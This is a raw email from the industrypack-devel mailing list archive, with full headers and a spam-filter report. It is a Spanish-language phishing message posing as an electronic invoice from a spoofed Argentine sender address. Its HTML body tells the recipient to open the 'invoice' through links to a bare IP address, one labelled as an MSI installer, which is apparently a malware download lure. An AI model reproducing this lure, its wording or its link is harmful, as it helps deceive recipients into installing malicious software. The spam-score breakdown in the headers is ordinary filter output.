Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id D383355FF17
	for <lists+industrypack-devel@lfdr.de>; Wed, 29 Jun 2022 13:55:23 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.94.2)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1o6WHx-0008D9-3D
	for lists+industrypack-devel@lfdr.de; Wed, 29 Jun 2022 11:55:21 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.94.2)
 (envelope-from <www-data@pro86.dynuddns.com>) id 1o6WHn-0008D1-WE
 for industrypack-devel@lists.sourceforge.net; Wed, 29 Jun 2022 11:55:12 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Date:Message-Id:From:Content-type:MIME-Version:
 Subject:To:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=k1EflQCUYOa+vSb3L0wmaVKLm+28DjqnBQeWNqhDx/Q=; b=H4d/9JyexODt3t9IcwHIK2SqGO
 dgGMmODIsyDYVkucN3al9h6/tER6tpgj+Nj+s8zG6rK3I5s8nsnIsOxQoeAFBz/whWBWF4lB0T2Dg
 F4AB72SrX+d/1dWDTtlZtHy9zUKD9RSyVs9/+IJBmVKLb1Wabr5MKilEt8e9oZUd2W3k=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Date:Message-Id:From:Content-type:MIME-Version:Subject:To:Sender:Reply-To
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=k1EflQCUYOa+vSb3L0wmaVKLm+28DjqnBQeWNqhDx/Q=; b=e
 o8nt1dfPywBv5SHCFZ9zKmyEKPl3aRy+IjSY2oweKowFYxqKvqKtRIkAb2dYxiCXWTXexnp9fKkub
 KXB975H7GhNof8yfDyIehuef+lCe0HBKdH1yIVo+RoWyUi4inOEr+Ffg0+llp6qAw1AbiwH21dcsg
 S0tkCny+XsOfX1N4=;
Received: from [45.10.58.56] (helo=pro86.dynuddns.com)
 by sfi-mx-1.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.94.2)
 id 1o6WHo-000tea-1m
 for industrypack-devel@lists.sourceforge.net; Wed, 29 Jun 2022 11:55:12 +0000
Received: by pro86.dynuddns.com (Postfix, from userid 33)
 id BA35421C69; Wed, 29 Jun 2022 11:30:00 +0000 (UTC)
To: industrypack-devel@lists.sourceforge.net
MIME-Version: 1.0
From: Financiero <facturacion@argentina.gobss.ar>
Message-Id: <20220629113000.BA35421C69@pro86.dynuddns.com>
Date: Wed, 29 Jun 2022 11:30:00 +0000 (UTC)
X-Spam-Score: 6.8 (++++++)
X-Spam-Report: Spam detection software, running on the system "util-spamd-2.v13.lw.sourceforge.com",
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 
 Content preview:  8573505 Emisión de Factura Electrónica Estimado (a) cliente
    Se emitió una Factura Electrónica para su pedido número 8573505 realizada
    el 29/06/2022 a las 04:59:30 
 
 Content analysis details:   (6.8 points, 6.0 required)
 
  pts rule name              description
 ---- ---------------------- --------------------------------------------------
  0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
                             blocked.  See
                             http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
                              for more information.
                             [URIs: 20.247.100.164]
  0.4 NO_DNS_FOR_FROM        DNS: Envelope sender has no MX or A DNS records
  0.2 HEADER_FROM_DIFFERENT_DOMAINS From and EnvelopeFrom 2nd level
                             mail domains are different
  0.8 DKIM_ADSP_NXDOMAIN     No valid author signature and domain not in
                             DNS
  0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
  0.0 SPF_NONE               SPF: sender does not publish an SPF Record
  0.0 NORMAL_HTTP_TO_IP      URI: URI host has a public dotted-decimal IPv4
                              address
  0.0 NUMERIC_HTTP_ADDR      URI: Uses a numeric IP address in URL
  0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
  0.0 HTML_MESSAGE           BODY: HTML included in message
  1.3 RCVD_IN_VALIDITY_RPBL  RBL: Relay in Validity RPBL,
                             https://senderscore.org/blocklistlookup/
                             [45.10.58.56 listed in bl.score.senderscore.com]
 -0.0 T_SCC_BODY_TEXT_LINE   No description available.
  1.3 RDNS_NONE              Delivered to internal network by a host with no rDNS
  1.2 TO_NO_BRKTS_NORDNS_HTML To: lacks brackets and no rDNS and HTML
                             only
  1.5 CONTENT_AFTER_HTML_WEAK More content after HTML close tag
X-Headers-End: 1o6WHo-000tea-1m
Subject: [Industrypack-devel] EMISION DE FACTURA ELECTRONICA - [ id
 386919255 ]
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============2495702152307799706=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============2495702152307799706==
Content-type: text/html; charset=iso-8859-1

<html>



<head>

<meta http-equiv="Content-Language" content="pt-br">

<meta http-equiv="Content-Type" content="text/html; charset=utf-8">

<title>8573505</title>

</head>



<body>



<p><font face="Verdana"><font color="#000080"><b>Emisi&oacute;n de Factura Electr&oacute;nica</b></font><br>

----------------------------------------<br>

<b><font style="font-size: 11pt">Estimado (a) cliente
</font></b><span style="font-size: 11pt"><br>

&nbsp;<br>

Se emiti&oacute; una Factura Electr&oacute;nica para su pedido n&uacute;mero <font color="#800000">

8573505</font> realizada el 29/06/2022 a las 04:59:30<br>

&nbsp;<br>

<b>Factura Eletr&oacute;nica</b><br>

&nbsp;<br>

Elija a continuaci&oacute;n la mejor manera de consultar su factura</span><br>

<br>

&nbsp;<br>

<font size="2">- <a href="http://20.247.100.164/
">Ver en formato MSI</a></font><font size="2"><br>

- <a href="http://20.247.100.164/
">Ver en formato XML</a></font><br>

&nbsp;</font></p>



</body>



</html>29/06/2022 11:30:00


--===============2495702152307799706==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============2495702152307799706==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============2495702152307799706==--
